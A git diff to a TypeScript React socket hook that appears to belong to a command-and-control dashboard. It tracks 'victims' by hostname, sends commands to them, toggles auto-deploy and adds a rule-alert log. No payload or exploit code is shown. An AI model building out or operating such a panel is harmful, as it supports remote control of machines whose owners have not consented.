@@ -30,6 +30,15 @@ export interface BackendLogEntry {
   timestamp: string;
 }
 
+export interface AlertLogEntry {
+  rule: string;
+  hostname: string;
+  field: string;
+  value: string;
+  action: string;
+  timestamp: string;
+}
+
 interface UseSocketReturn {
   victims: Record<string, BackendVictimInfo>;
   logs: BackendLogEntry[];
@@ -39,6 +48,7 @@ interface UseSocketReturn {
   unlockError: string;
   autoDeploy: Record<string, boolean>;
   stats: { victimCount: number; logCount: number };
+  alertLog: AlertLogEntry[];
   sendCommand: (hostname: string, command: string, params?: Record<string, string>) => void;
   toggleAutoDeploy: (hostname: string, enabled: boolean) => void;
   unlockServer: (password: string) => void;
@@ -54,6 +64,7 @@ export default function useSocket(): UseSocketReturn {
   const [needsSetup, setNeedsSetup] = useState(false);
   const [unlockError, setUnlockError] = useState('');
   const [autoDeploy, setAutoDeploy] = useState<Record<string, boolean>>({});
+  const [alertLog, setAlertLog] = useState<AlertLogEntry[]>([]);
   const [stats, setStats] = useState({ victimCount: 0, logCount: 0 });
   const socketRef = useRef<Socket | null>(null);
 
@@ -132,6 +143,14 @@ export default function useSocket(): UseSocketReturn {
       });
     });
 
+    s.on('rule_alert', (data: AlertLogEntry) => {
+      setAlertLog(prev => [data, ...prev].slice(0, 200));
+    });
+
+    s.on('alert_log_update', (data: { entry: AlertLogEntry }) => {
+      setAlertLog(prev => [data.entry, ...prev].slice(0, 200));
+    });
+
     socketRef.current = s;
     return () => { s.disconnect(); };
   }, []);
@@ -171,5 +190,5 @@ export default function useSocket(): UseSocketReturn {
     setUnlockError('');
   }, []);
 
-  return { victims, logs, connected, locked, needsSetup, unlockError, autoDeploy, stats, sendCommand, toggleAutoDeploy, unlockServer, setupPassword, clearUnlockError };
+  return { victims, logs, connected, locked, needsSetup, unlockError, autoDeploy, stats, alertLog, sendCommand, toggleAutoDeploy, unlockServer, setupPassword, clearUnlockError };
 }
